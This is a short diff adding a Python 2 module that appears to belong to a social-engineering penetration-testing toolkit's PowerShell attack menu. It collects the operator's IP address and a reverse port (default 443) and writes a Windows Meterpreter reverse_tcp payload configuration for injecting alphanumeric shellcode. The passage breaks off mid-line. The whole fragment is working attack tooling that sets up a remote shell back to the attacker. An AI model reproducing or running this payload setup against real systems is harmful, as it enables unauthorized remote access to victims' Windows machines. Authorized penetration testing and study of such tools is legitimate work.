@@ -1,0 +1,17 @@
+
+me = mod_name()
+debug_msg(me, "printing 'text.powershell menu'",5)
+show_powershell_menu = create_menu(text.powershell_text, text.powershell_menu)
+powershell_menu_choice = raw_input(setprompt(["29"], ""))
+if powershell_menu_choice != "99":
+	ipaddr = grab_ipaddress()
+	update_options("IPADDR=" + ipaddr)
+	if powershell_menu_choice == "1":
+		port = raw_input(setprompt(["29"], "Enter the port for the reverse [443]"))
+		if port == "": port = "443"
+		update_options("PORT=" + port)
+		update_options("POWERSHELL_SOLO=ON")
+		print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
+		filewrite = file(setdir + "/payload_options.shellcode", "w")
+		filewrite.write("windows/meterpreter/reverse_tcp " + port + ",")
+		filewrit
